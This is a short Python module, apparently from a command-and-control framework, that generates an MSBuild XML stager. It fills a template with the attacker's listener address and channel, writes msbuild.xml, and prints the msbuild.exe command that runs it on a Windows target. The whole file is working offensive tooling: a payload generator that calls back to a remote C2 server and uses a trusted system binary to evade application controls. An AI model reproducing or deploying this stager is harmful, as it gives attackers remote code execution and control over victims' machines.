from core.utils import print_good, print_info


class STStager:
    def __init__(self):
        self.name = 'msbuild'
        self.description = 'Stage via MSBuild XML inline C# task'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener):
        with open('msbuild.xml', 'w') as stager:
            with open('stagers/templates/msbuild.xml') as template:
                template = template.read()
                template = template.replace('C2_URL', f"https://{listener['BindIP']}:{listener['Port']}")
                template = template.replace('C2_CHANNEL', f"{listener.name}")
                stager.write(template)

                print_good(f"Generated stager to {stager.name}")
                print_info("Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe msbuild.xml'")
